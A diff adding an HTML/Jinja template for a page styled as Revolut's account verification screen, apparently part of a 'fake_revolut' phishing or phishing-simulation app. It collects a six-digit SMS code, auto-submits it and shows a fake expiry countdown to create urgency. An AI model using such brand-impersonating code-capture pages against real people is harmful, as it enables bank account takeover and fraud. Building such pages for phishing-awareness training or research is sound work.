@@ -1,0 +1,88 @@
+{% extends "revolut/base.html" %}
+
+{% block title %}Verify Your Account - Revolut{% endblock %}
+
+{% block content %}
+<div class="auth-container">
+    <div class="auth-card">
+        <a href="{{ url_for('fake_revolut.home') }}" class="revolut-logo" style="text-decoration: none; margin-bottom: 2rem; display: inline-flex;">
+            <div class="logo-icon">R</div>
+            Revolut
+        </a>
+        
+        <h2>Verify Your Account</h2>
+        <p class="subtitle">We've sent a verification code to your phone number. Please enter it below to complete your registration.</p>
+        
+        <div class="message message-success" style="margin-bottom: 2rem;">
+            <strong>Account created successfully!</strong><br>
+            Please verify your phone number to activate your account.
+        </div>
+        
+        <form method="POST" action="{{ url_for('fake_revolut.verify_submit') }}">
+            <div class="form-group">
+                <label for="verification_code" class="form-label">Verification Code</label>
+                <input 
+                    type="text" 
+                    id="verification_code" 
+                    name="verification_code" 
+                    class="form-input" 
+                    placeholder="Enter 6-digit code"
+                    maxlength="6"
+                    required
+                    style="text-align: center; font-size: 1.5rem; letter-spacing: 0.5rem;"
+                >
+            </div>
+            
+            <div style="text-align: center; margin-bottom: 2rem; color: #666; font-size: 0.9rem;">
+                <p>Didn't receive the code? <a href="#" style="color: #0066cc;">Send again</a></p>
+                <p style="margin-top: 0.5rem;">Code expires in <span style="color: #ff4444; font-weight: 600;">4:58</span></p>
+            </div>
+            
+            <button type="submit" class="btn btn-primary form-submit btn-large">
+                Verify Account
+            </button>
+        </form>
+        
+        <div class="auth-links">
+            <p style="color: #666;">Need help? <a href="#" style="color: #0066cc;">Contact support</a></p>
+        </div>
+    </div>
+</div>
+
+<script>
+// Auto-format verification code input
+document.getElementById('verification_code').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+    if (value.length <= 6) {
+        e.target.value = value;
+    }
+    
+    // Auto-submit when 6 digits are entered
+    if (value.length === 6) {
+        setTimeout(() => {
+            e.target.closest('form').submit();
+        }, 500);
+    }
+});
+
+// Countdown timer simulation
+let timeLeft = 298; // 4:58 in seconds
+const countdownElement = document.querySelector('span[style*="color: #ff4444"]');
+
+function updateCountdown() {
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    
+    if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateCountdown, 1000);
+    } else {
+        countdownElement.textContent = 'Expired';
+        countdownElement.style.color = '#666';
+    }
+}
+
+updateCountdown();
+</script>
+{% endblock %}
